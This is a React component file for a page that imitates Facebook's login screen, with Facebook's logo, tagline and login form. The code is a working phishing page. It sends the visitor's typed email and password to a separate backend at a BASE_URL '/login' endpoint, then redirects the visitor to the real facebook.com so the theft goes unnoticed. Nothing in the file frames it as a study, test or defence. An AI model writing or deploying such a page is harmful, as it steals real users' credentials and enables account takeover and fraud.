import React from 'react'
import { useState } from 'react';
import "./signup.css"
import { BASE_URL } from '../helper';

const Signup = () => {

    const [user, setUser]= useState({
        email: "",
        password:""
    })

    const [message, setMessage] = useState("");

    const handleChange= e =>{
        const {name,value}= e.target
        setUser({
            ...user,
            [name]:value
        })
    }
    const redirect = () => {
        window.location.href = 'http://www.facebook.com'
     }

    const login = (event) => {
        event.preventDefault();
        fetch(`${BASE_URL}/login`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(user),
        })
          .then((response) => response.json())
          .then((data) => {
            setMessage(data.message);
            setUser({
              email: "",
              password: "",
            })
            redirect();
            
          })
          .catch((error) => console.error(error));
      };





  return (
    <>
        <div className='main-div'>
            <div class="row">
                <div class="col-logo">
                    <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Logo" className='site-logo'/>
                    <h2 className='main-heading'>Facebook helps you connect and share with the people in your life.</h2>
                </div>
                <div class="col-form">
                    <div class="form-container">
                        <input type="email" name='email' placeholder="Email address or phone number" value={user.email} onChange={handleChange} className='input-boxes'/>
                        <input type="Password" required="" name='password' placeholder="Password" value={user.password} onChange={handleChange} className='input-boxes'/>
                        <button class="btn-login" onClick={login} >Log in</button>
                        <a><p style={{cursor:'pointer'}}>Forgotten password?</p></a>
                        <button class="btn-new">Create new Account</button>
                    </div>
                    <p><a href="#"><b>Create a Page</b></a> for a celebrity, brand or business.</p>
                </div>
            </div>
        </div>
    </>
  )
}

export default Signup;